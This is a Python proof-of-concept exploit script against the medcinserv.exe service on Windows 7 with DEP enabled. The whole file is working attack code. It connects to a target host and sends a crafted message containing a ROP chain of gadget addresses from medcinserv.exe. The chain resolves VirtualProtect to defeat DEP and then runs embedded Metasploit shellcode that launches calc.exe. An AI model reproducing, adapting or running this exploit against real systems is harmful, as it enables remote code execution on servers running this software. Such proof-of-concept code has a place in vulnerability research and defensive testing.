#***********************************************
# Description: POC for spawning calc.exe
# Service: medcinserv.exe
# OS: Windows 7 - DEP Enabled
# Author: b0yd

import socket
import sys
import struct
import os
import binascii

# windows/exec - 193 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
# CMD=calc.exe
sc =  ""
sc += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
sc += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
sc += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
sc += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
sc += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
sc += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
sc += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
sc += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
sc += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
sc += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
sc += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
sc += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
sc += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
sc += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
sc += "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

def send(type, pack_len, data=None):
	
	if pack_len < 6 or pack_len > 0x3d090:
		print "Length(Arg 2) must be between 6 and 0x3d090 bytes."
	
	#Set the type
	buf = struct.pack('>h', type)
	
	#Send length, must be less than 0x3d090, can be negative
	buf += struct.pack('>i', pack_len)
	
	#Send data
	if pack_len > 0:
		if data == None:
			data = os.urandom(pack_len-6)
		else:
			data_len = len(data)
			curr_size = data_len +6
			if curr_size < pack_len:
				data += os.urandom( pack_len - curr_size)
		buf += data
		
	#Send and receive
	if write_to_file == False:
		#print binascii.hexlify(buf)
		csock.send(buf)
	else:
		f = open('raw_exp', 'wb')
		f.write(buf)
		f.close()
	
		
def add_shellcode():
	global sc
	global data
	
	#Determine the iterator
	shellcode_len = len(sc)
	iterator = shellcode_len / 4
	if shellcode_len % 4 > 0:
		iterator +=1
		
	counter = 0
	#print "Length: " + str(shellcode_len) + " Iterator: " + str(iterator)
	for i in range( int( iterator ) ):
		entry = sc[ (i*4) : (i*4)+4 ]
		
		#Make sure length is four bytes
		len_entry = len(entry)
		if len( entry ) < 4:
			entry += "\x90" * ( 4 - len_entry) 
		data += str(struct.unpack("<I", entry )[0]) + ","
		counter += 1
	
	return counter
	
def add_string( passed_str ):
		
	out_str = ''
	#Determine the iterator
	str_len = len(passed_str)
	iterator = str_len / 4
	if str_len % 4 > 0:
		iterator +=1
		
	for i in range( int( iterator ) ):
		sub_str = passed_str[ (i*4) : (i*4)+4 ]
		
		#Make sure length is four bytes
		len_entry = len(sub_str)
		if len( sub_str ) < 4:
			sub_str += "\x00" * ( 4 - len_entry) 
		an_int = struct.unpack( '<i' , sub_str)[0]
		out_str += str( an_int ) + ","
	
	return out_str

if len (sys.argv) == 3:
    (progname, host, port) = sys.argv
else:
    print len (sys.argv)
    print 'Usage: {0} host port'.format (sys.argv[0])
    exit (1)

#Write out flag
write_to_file = False
	
if write_to_file == False:
	csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
	csock.connect ( (host, int(port)) )
	csock.settimeout(1)


print "[+] connected to server."
	
#Msg type
i = 238

#strings
virt_prot = "VirtualProtect" +"\x00"

temp = ''
temp += add_string(virt_prot)
	
#Setup the buffer
data = ''
data += "1," * ( 612 )
	
#Get stack address for module name
data += str(0x0042dfa1) + ","  # POP EDI # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x00471BF0) + ","  # Static Address of "Kernel32" string

#Get GetModuleHandle function ptr from IAT
data += str(0x0042b2ae) + ","  # POP EAX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x0047104C) + ","  # 0x76923475 - Kernel32.GetModuleHandleA
data += str(0x00429141) + ","  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x41414141) + "," 
data += str(0x00419ec2) + ","  # XCHG EAX,EDX # ADD AL,BYTE PTR DS:[EAX] # ADD ESP,0C # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x41414141) + "," 
data += str(0x41414141) + "," 	
data += str(0x41414141) + "," 

#Setup remaining args for GetModuleHandle
data += str(0x00434880) + ","  # MOV EAX,EDI # POP EDI # POP ESI # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x004202df) + ","  # RETN
data += str(0x0041d1ab) + ","  # ADD ESP,0C # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x0046f602) + ","  # POP ECX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x004202df) + ","  # RETN
data += str(0x00407b6d) + ","  # PUSHAD # ADD EAX,EBX # MOV AX,361 # RETN 


#**************************************************************
# 0x00403d35 :  # ADD ECX,EAX # XOR EAX,EAX # ADD ECX,EDX # POP ESI # TEST ECX,ECX # SETG AL # RETN 
#Save kernel32.dll base addr in ecx
data += str(0x0046f602) + ","  # POP ECX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x00000001) + ","  # RETN
data += str(0x0043344b) + ","  # XCHG EAX,ECX # ADD EAX,DWORD PTR FS:[EAX] # ADD ESP,8 # RETN    ** [medcinserv.exe] **   |  startnull,asciiprint,ascii,alphanum,uppernum {PAGE_EXECUTE_READ}
data += str(0x41414141) + "," 
data += str(0x41414141) + "," 

#Put readable location in eax and return in edx
data += str(0x0042b2ae) + ","  # POP EAX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x00480490) + ","  # 
data += str(0x004309f7) + ","  # POP EDX # ADD EAX,DWORD PTR DS:[EAX] # ADD ESP,4 # RETN 
data += str(0x004202df) + "," 
data += str(0x41414141) + "," 

#Get GetProcAddress function ptr from IAT
data += str(0x0042b2ae) + ","  # POP EAX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x004710AC) + ","  # 0x76923475 - Kernel32.GetProcAddress
data += str(0x00429141) + ","  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}

#offset to be replaced
data += str(0xdeadbeef) + "," 

data += str(0x0040c804) + ","  # POP EBX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0xffffffff) + "," 
data += str(0x00405d9c) + ","  # INC EBX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x0042e10d) + ","  # ADD EBX,EAX # AND EAX,2 # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}

#Get a stack address 
data += str(0x00446dd7) + ","  # XCHG EAX,EBP # RETN 
data += str(0x0040270a) + ","  # SUB ESI,EAX # MOV EAX,ESI # POP ESI # RETN    ** [medcinserv.exe] **   |  startnull,ascii {PAGE_EXECUTE_READ}
data += str(0x00000001) + ","  # ADD ESP,8 # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x0040270a) + ","  # SUB ESI,EAX # MOV EAX,ESI # POP ESI # RETN    ** [medcinserv.exe] **   |  startnull,ascii {PAGE_EXECUTE_READ}
data += str(0x0046d84c) + ","  # ADD ESP,8 # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}


#Setup remaining args for GetProcAddress
data += str(0x0042dfa1) + ","  # POP EDI # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x004202df) + ","  # RETN
data += str(0x00407b6d) + ","  # PUSHAD # ADD EAX,EBX # MOV AX,361 # RETN 

# 0x00419ec2 (RVA : 0x00019ec2) : # XCHG EAX,EDX # ADD AL,BYTE PTR DS:[EAX] # ADD ESP,0C # RETN
#eax = hmodule addr - needs to be ecx
#ebx = func name addr - needs to be eax
#edx = func_addr - needs to be ebx
#ecx = rtn - needs to be edx
#esi = add esp, 0c
#edi = rtn

#Virtual Protect
data += str(0x0045c9cd) + "," # PUSH EAX # LEA ECX,DWORD PTR DS:[EAX] # POP ESI # POP EDI # RETN [medcinserv.exe] 
data += str(0x41414141) + "," # Filler (compensate)
data += str(0x0043cf6d) + "," # POP EBP # RETN [medcinserv.exe] 
data += str(0x0041e162) + "," # & push esp # ret  [medcinserv.exe]
data += str(0x00430ec1) + "," # POP EBX # RETN [medcinserv.exe] 
data += str(0x00000300) + "," # 0x00000300-> ebx

#Put readable location in eax and return in edx
data += str(0x0042b2ae) + ","  # POP EAX # RETN    ** [medcinserv.exe] **   |  startnull {PAGE_EXECUTE_READ}
data += str(0x00480490) + ","  # 
data += str(0x004309f7) + ","  # POP EDX # ADD EAX,DWORD PTR DS:[EAX] # ADD ESP,4 # RETN 
data += str(0x004202df) + "," 
data += str(0x41414141) + "," 

#Do stuff
data += str(0x0042b784) + "," # POP EAX # RETN [medcinserv.exe] 
data += str(0x00000040) + "," # 0x00000040-> edx
data += str(0x00419f57) + "," # XCHG EAX,EDX # ADD AL,BYTE PTR DS:[EAX] # ADD ESP,0C # RETN [medcinserv.exe] 
data += str(0x41414141) + "," # Filler (compensate)
data += str(0x41414141) + "," # Filler (compensate)
data += str(0x41414141) + "," # Filler (compensate)
data += str(0x00418af4) + "," # POP ECX # RETN [medcinserv.exe] 
data += str(0x004831c3) + "," # &Writable location [medcinserv.exe]
data += str(0x0045245d) + "," # POP EDI # RETN [medcinserv.exe] 
data += str(0x0041e162) + "," # RETN (ROP NOP) [medcinserv.exe]
data += str(0x0042b38d) + "," # POP EAX # RETN [medcinserv.exe] 
data += str(0x004425bf) + "," # nop
data += str(0x00407b6d) + "," # PUSHAD # ADD EAX,EBX # MOV AX,361 # RETN 
data += str(0x90909090) + ","

#add shellcode
add_shellcode()

#Get current offset
data += "1," * ( 0x10 )
const_str_pos = data.count(",")

#add Virtual Protect string
data += temp
data += str(0x10000000) + ","
data += "1," * ( 0x10 )
data += "1\x00"

#calc offset
total_diff = 0xdb0
curr_offset_in_buf = const_str_pos * 4
offset = int(total_diff - curr_offset_in_buf) + 1

#replace the place holder
data = data.replace(str(0xdeadbeef), str(offset))
	
print "[+] sending shellcode."
send( i, len(data) + 6, data)

print "[*] shellz?"	

if write_to_file == False:
	csock.close()
	
print "[+] goodbye"	